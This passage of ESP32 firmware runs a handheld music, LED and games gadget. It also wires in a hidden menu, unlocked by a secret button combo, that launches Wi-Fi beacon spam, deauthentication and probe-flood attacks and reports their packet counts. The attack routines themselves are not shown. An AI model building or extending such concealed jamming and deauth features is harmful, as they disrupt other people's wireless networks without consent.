    else if (atkMode == ATK_PROBE) display.print(F("Probe Flood"));
    else display.print(F("Attack"));
    display.setCursor(4, 30);
    display.print(F("Target: "));
    char tbuf[14]; strncpy(tbuf, atkSSID, 13); tbuf[13] = 0;
    display.print(tbuf[0] ? tbuf : "broadcast");
    display.setTextSize(2);
    char buf[12];
    snprintf(buf, sizeof(buf), "%d", atkPacketCount);
    int tw = strlen(buf) * 12;
    display.setCursor((SCR_W - tw) / 2, 42);
    display.print(buf);
    display.setTextSize(1);
    drawCentered("packets sent", 58, 1);
    display.display();
}

// ═══════════════════════════════════════════════════════════
//  MODE HANDLERS
// ═══════════════════════════════════════════════════════════
static void handleMainMenu(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 6) % 6;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 6;
    else if (ev == 2) {
        switch (g.menuSel) {
            case 0:
                if (songCount > 0) { playSong(random(0, songCount)); g.mode = MODE_PLAYER; }
                break;
            case 1: g.mode = MODE_SONGS; g.menuSel = 0; break;
            case 2: g.mode = MODE_BLUETOOTH; g.menuSel = 0; break;
            case 3: g.mode = MODE_GAMES; g.menuSel = 0; break;
            case 4: g.mode = MODE_LED_MENU; g.menuSel = 0; break;
            case 5: g.mode = MODE_FLASHLIGHT_MENU; g.menuSel = 0; break;
        }
    }
}
static void handleSongsMenu(int ev) {
    int total = songCount + 1;
    if (total < 1) total = 1;
    if (ev == 0) g.menuSel = (g.menuSel - 1 + total) % total;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % total;
    else if (ev == 2) {
        if (g.menuSel == 0) {
            g.mode = MODE_WIFI_FILES;
            if (!webServersRunning) startWebServers();
        } else {
            playSong(g.menuSel - 1);
            g.mode = MODE_PLAYER;
        }
    } else if (ev == 3) { g.mode = MODE_MAIN_MENU; g.menuSel = 1; }
}
static void handlePlayer(int ev) {
    if (ev == 0) { setVolume(g.volume + 5); triggerVolPopup(); }
    else if (ev == 1) { setVolume(g.volume - 5); triggerVolPopup(); }
    else if (ev == 2) { togglePause(); }
    else if (ev == 3) { g.mode = MODE_SONGS; g.menuSel = g.currentSong + 1; }
    else if (ev == 6) { g.mode = MODE_PLAYER_SYNC; }
    else if (ev == 4) { prevSong(); }
    else if (ev == 5) { nextSong(); }
}
static void handlePlayerSync(int ev) {
    if (ev == 0) { if (g.syncEffect > 4) g.syncEffect--; }
    else if (ev == 1) { if (g.syncEffect < 11) g.syncEffect++; }
    else if (ev == 2) { g.curEffect = g.syncEffect; }
    else if (ev == 3) { g.mode = MODE_PLAYER; }
}
static void handleBluetoothMenu(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 3) % 3;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 3;
    else if (ev == 3) { g.mode = MODE_MAIN_MENU; g.menuSel = 2; }
}
static void handleGamesMenu(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 2) % 2;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 2;
    else if (ev == 2) {
        if (g.menuSel == 0) { initFlappy(); g.mode = MODE_FLAPPY; }
        else { initSnake(); g.mode = MODE_SNAKE; }
    } else if (ev == 3) { g.mode = MODE_MAIN_MENU; g.menuSel = 3; }
}
static void handleFlappy(int ev) {
    if (ev == 2) { fbBirdVy = -50; }
    else if (ev == 3) { g.mode = MODE_GAMES; g.menuSel = 0; }
}
static void handleSnake(int ev) {
    if (ev == 0) { if (snDir != 2) snDir = 0; }
    else if (ev == 1) { if (snDir != 3) snDir = 1; }
    else if (ev == 3) { g.mode = MODE_GAMES; g.menuSel = 1; }
}
static void handleLedMenu(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 4) % 4;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 4;
    else if (ev == 2) {
        if (g.menuSel == 0) { g.mode = MODE_LED_EFFECTS; g.menuSel = g.curEffect; }
        else if (g.menuSel == 1) { g.mode = MODE_LED_MUSIC; g.menuSel = 0; }
        else if (g.menuSel == 2) { g.mode = MODE_LED_BRIGHT; }
        else if (g.menuSel == 3) { g.mode = MODE_LED_WIFI; if (!webServersRunning) startWebServers(); }
    } else if (ev == 3) { g.mode = MODE_MAIN_MENU; g.menuSel = 4; }
}
static void handleLedEffects(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 4) % 4;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 4;
    else if (ev == 2) { g.curEffect = g.menuSel; }
    else if (ev == 3) { g.mode = MODE_LED_MENU; g.menuSel = 0; }
}
static void handleLedMusic(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 9) % 9;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 9;
    else if (ev == 2) {
        if (g.menuSel == 0) {
            if (songCount > 0) { playSong(random(0, songCount)); g.mode = MODE_PLAYER; }
        } else {
            g.syncEffect = g.menuSel + 4;
            g.curEffect = g.syncEffect;
        }
    } else if (ev == 3) { g.mode = MODE_LED_MENU; g.menuSel = 1; }
}
static void handleLedBright(int ev) {
    if (ev == 0) { g.ledBright = min(g.ledBright + 15, 255); strip.setBrightness(g.ledBright); }
    else if (ev == 1) { g.ledBright = max(g.ledBright - 15, 0); strip.setBrightness(g.ledBright); }
    else if (ev == 3) { g.mode = MODE_LED_MENU; g.menuSel = 2; }
}
static void handleLedWifi(int ev) {
    if (ev == 2) {
        if (!webServersRunning) startWebServers();
        else stopWebServers();
    } else if (ev == 3) { g.mode = MODE_LED_MENU; g.menuSel = 3; }
}
static void handleFlashMenu(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 5) % 5;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 5;
    else if (ev == 2) {
        switch (g.menuSel) {
            case 0: flashSetPower(!flashOn); break;
            case 1: g.flashBright = (g.flashBright + 25) % 125; if (g.flashBright == 0) g.flashBright = 25; break;
            case 2: g.flashColor = (g.flashColor + 1) % 7; break;
            case 3: g.flashEffect = (g.flashEffect + 1) % 5; break;
            case 4: g.mode = MODE_MAIN_MENU; g.menuSel = 5; break;
        }
    } else if (ev == 3) { g.mode = MODE_MAIN_MENU; g.menuSel = 5; }
}
static void handleSettings(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 5) % 5;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 5;
    else if (ev == 2) {
        if (g.menuSel == 0) { g.displaySleepEnabled = !g.displaySleepEnabled; }
        else if (g.menuSel == 1) { g.ledBright = (g.ledBright + 50) % 256; strip.setBrightness(g.ledBright); }
        else if (g.menuSel == 3) { g.mode = MODE_SETTINGS_INFO; }
    } else if (ev == 3) { g.mode = MODE_MAIN_MENU; }
}
static void handleSettingsInfo(int ev) {
    if (ev == 3) { g.mode = MODE_SETTINGS; }
}
static void handleWifiFiles(int ev) {
    if (ev == 2) { if (!webServersRunning) startWebServers(); }
    else if (ev == 3) {
        if (webServersRunning) stopWebServers();
        g.mode = MODE_SONGS;
        g.menuSel = 0;
    }
}
static void handleHiddenMenu(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 4) % 4;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 4;
    else if (ev == 2) {
        switch (g.menuSel) {
            case 0: g.mode = MODE_WIFI_TOOLS; g.menuSel = 0; break;
            case 1: g.mode = MODE_BT_TOOLS; g.menuSel = 0; break;
            case 2: g.mode = MODE_IR_REMOTE; g.menuSel = 0; break;
            case 3: g.mode = MODE_WIFI_CONTROL; if (!webServersRunning) startWebServers(); break;
        }
    } else if (ev == 3) { g.mode = MODE_MAIN_MENU; }
}
static void handleWifiTools(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 4) % 4;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 4;
    else if (ev == 2) {
        if (g.menuSel == 0) { wifiScan(); }
        else if (g.menuSel == 1) { startBeaconSpam(); g.mode = MODE_ATTACK_RUN; }
        else if (g.menuSel == 2) {
            if (scannedCount == 0) wifiScan();
            if (scannedCount > 0) { startDeauth(0); g.mode = MODE_ATTACK_RUN; }
        } else if (g.menuSel == 3) { startProbe(); g.mode = MODE_ATTACK_RUN; }
    } else if (ev == 3) { g.mode = MODE_HIDDEN_MENU; g.menuSel = 0; }
}
static void handleBtTools(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 3) % 3;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 3;
    else if (ev == 3) { g.mode = MODE_HIDDEN_MENU; g.menuSel = 1; }
}
static void handleIRMenu(int ev) {
    if (ev == 0) g.menuSel = (g.menuSel - 1 + 3) % 3;
    else if (ev == 1) g.menuSel = (g.menuSel + 1) % 3;
    else if (ev == 3) { g.mode = MODE_HIDDEN_MENU; g.menuSel = 2; }
}
static void handleWifiControl(int ev) {
    if (ev == 2) {
        if (!webServersRunning) startWebServers();
        else stopWebServers();
    } else if (ev == 3) { g.mode = MODE_HIDDEN_MENU; g.menuSel = 3; }
}
static void handleAttackRun(int ev) {
    if (ev == 2 || ev == 3) {
        stopAttack();
        g.mode = MODE_WIFI_TOOLS;
        g.menuSel = 1;
    }
}

// ═══════════════════════════════════════════════════════════
//  COMBO
// ═══════════════════════════════════════════════════════════
static void updateCombo(int ev) {
    if (g.mode == MODE_HIDDEN_MENU || g.mode == MODE_WIFI_TOOLS ||
        g.mode == MODE_BT_TOOLS || g.mode == MODE_IR_REMOTE ||
        g.mode == MODE_WIFI_CONTROL || g.mode == MODE_ATTACK_RUN) return;
    if (ev < 0 || ev > 3) return;
    unsigned long now = millis();
    if (now - comboLastMs > COMBO_TIMEOUT_MS) comboSeq = 0;
    comboLastMs = now;
    static const int seq[] = {0, 0, 1, 1, 2};
    if (comboSeq < 5 && ev == seq[comboSeq]) {
        comboSeq++;
        if (comboSeq == 5) {
            comboSeq = 0;
            g.mode = MODE_HIDDEN_MENU;
            g.menuSel = 0;
        }
    } else {
        comboSeq = (ev == 0) ? 1 : 0;
    }
}

// ═══════════════════════════════════════════════════════════
//  UI TASK
// ═══════════════════════════════════════════════════════════
static void uiTask(void*) {
    unsigned long lastRefresh = 0;

    for (;;) {
        int ev = pollButtons();

        if (g.mode != MODE_BOOT && ev >= 0) wakeDisplay();

        checkDisplaySleep();
        updateVolPopup();
        updateCombo(ev);

        if (webServersRunning) {
            ledServer.handleClient();
            fileServer.handleClient();
            attackServer.handleClient();
        }

        if (g.mode == MODE_LED_MENU || g.mode == MODE_LED_EFFECTS ||
            g.mode == MODE_LED_MUSIC || g.mode == MODE_LED_BRIGHT ||
            g.mode == MODE_LED_WIFI || g.mode == MODE_PLAYER_SYNC ||
            g.mode == MODE_WIFI_CONTROL) {
            updateLEDEffect();
        }
        if (flashOn) flashUpdate();

        // Boot animation - block all button events
        if (g.mode == MODE_BOOT) {
            updateBootAnim();
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        // Handle button events (not in boot mode)
        if (ev >= 0 && ev < 4) {
            switch (g.mode) {
                case MODE_MAIN_MENU:      handleMainMenu(ev); break;
                case MODE_SONGS:          handleSongsMenu(ev); break;
                case MODE_PLAYER:         handlePlayer(ev); break;
                case MODE_PLAYER_SYNC:    handlePlayerSync(ev); break;
                case MODE_BLUETOOTH:      handleBluetoothMenu(ev); break;
                case MODE_GAMES:          handleGamesMenu(ev); break;
                case MODE_FLAPPY:         handleFlappy(ev); break;
                case MODE_SNAKE:          handleSnake(ev); break;
                case MODE_LED_MENU:       handleLedMenu(ev); break;
                case MODE_LED_EFFECTS:    handleLedEffects(ev); break;
                case MODE_LED_MUSIC:      handleLedMusic(ev); break;
                case MODE_LED_BRIGHT:     handleLedBright(ev); break;
                case MODE_LED_WIFI:       handleLedWifi(ev); break;
                case MODE_FLASHLIGHT_MENU:handleFlashMenu(ev); break;
                case MODE_SETTINGS:       handleSettings(ev); break;
                case MODE_SETTINGS_INFO:  handleSettingsInfo(ev); break;
                case MODE_WIFI_FILES:     handleWifiFiles(ev); break;
                case MODE_HIDDEN_MENU:    handleHiddenMenu(ev); break;
                case MODE_WIFI_TOOLS:     handleWifiTools(ev); break;
                case MODE_BT_TOOLS:       handleBtTools(ev); break;
                case MODE_IR_REMOTE:      handleIRMenu(ev); break;
                case MODE_WIFI_CONTROL:   handleWifiControl(ev); break;
                case MODE_ATTACK_RUN:     handleAttackRun(ev); break;
                default: break;
            }
        } else if (ev >= 4) {
            int idx = ev - 4;
            // BACK long → toggle flashlight
            if (idx == 3) {
                flashSetPower(!flashOn);
                if (flashOn) {
                    g.mode = MODE_FLASHLIGHT_MENU;
                    g.menuSel = 0;
                }
            }
            // SEL long on player → sync mode
            if (idx == 2 && g.mode == MODE_PLAYER) g.mode = MODE_PLAYER_SYNC;
            // UP/DOWN long on player → prev/next
            if (idx == 0 && g.mode == MODE_PLAYER) prevSong();
            if (idx == 1 && g.mode == MODE_PLAYER) nextSong();
        }

        // Refresh screen every 100ms
        unsigned long now = millis();
        if (now - lastRefresh > 100) {
            lastRefresh = now;
            if (!displaySleep) {
                switch (g.mode) {
                    case MODE_MAIN_MENU:       drawMainMenu(); break;
                    case MODE_SONGS:           drawSongsMenu(); break;
                    case MODE_PLAYER:          drawPlayerScreen(); break;
                    case MODE_PLAYER_SYNC:     drawPlayerSync(); break;
                    case MODE_BLUETOOTH:       drawBluetoothMenu(); break;
                    case MODE_GAMES:           drawGamesMenu(); break;
                    case MODE_FLAPPY:          drawFlappy(); break;
                    case MODE_SNAKE:           drawSnake(); break;
                    case MODE_LED_MENU:        drawLedMenu(); break;
                    case MODE_LED_EFFECTS:     drawLedEffects(); break;
                    case MODE_LED_MUSIC:       drawLedMusic(); break;
                    case MODE_LED_BRIGHT:      drawLedBright(); break;
                    case MODE_LED_WIFI:        drawLedWifi(); break;
                    case MODE_FLASHLIGHT_MENU: drawFlashlightMenu(); break;
                    case MODE_SETTINGS:        drawSettings(); break;
                    case MODE_SETTINGS_INFO:   drawSettingsInfo(); break;
                    case MODE_WIFI_FILES:      drawWifiFiles(); break;
                    case MODE_HIDDEN_MENU:     drawHiddenMenu(); break;
                    case MODE_WIFI_TOOLS:      drawWifiTools(); break;
                    case MODE_BT_TOOLS:        drawBtTools(); break;
                    case MODE_IR_REMOTE:       drawIRMenu(); break;
                    case MODE_WIFI_CONTROL:    drawWifiControl(); break;
                    case MODE_ATTACK_RUN:      drawAttackRunning(); break;
                    default: break;
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }
}

static void audioTask(void*) {
    for (;;) {
        updateAudio();
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// ═══════════════════════════════════════════════════════════
//  SETUP & LOOP
// ═══════════════════════════════════════════════════════════
void setup() {
    Serial.begin(115200);
    delay(500);
    Serial.println(F("\n=== SOUMYA Gadget v9.0 ==="));

    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_SEL, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);

    SPI.begin(PIN_SD_CLK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
    if (!SD.begin(PIN_SD_CS)) Serial.println(F("SD FAIL"));
    else Serial.println(F("SD OK"));
    loadSongList();
    Serial.printf("Loaded %d songs\n", songCount);

    Wire.begin(OLED_SDA, OLED_SCL);
    if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
        Serial.println(F("OLED FAIL"));
        while (1) delay(1000);
    }
    display.clearDisplay();
    display.display();

    strip.begin();
    strip.setBrightness(g.ledBright);
    strip.clear();
    strip.show();

    statusStrip.begin();
    statusStrip.setBrightness(60);
    statusStrip.clear();
    statusStrip.show();

    randomSeed(analogRead(0));
    audioRB = new AudioOutputRingBuffer();
    g.btConnected = false;
    initAudio();

    lastActivityMs = millis();
    g.mode = MODE_BOOT;
    bootStep = 0;

    xTaskCreatePinnedToCore(audioTask, "audio", 8192, nullptr, 2, nullptr, 1);
    xTaskCreatePinnedToCore(uiTask, "ui", 12288, nullptr, 1, nullptr, 0);

    Serial.println(F("Ready"));
}

void loop() {
    vTaskDelay(pdMS_TO_TICKS(1000));
}
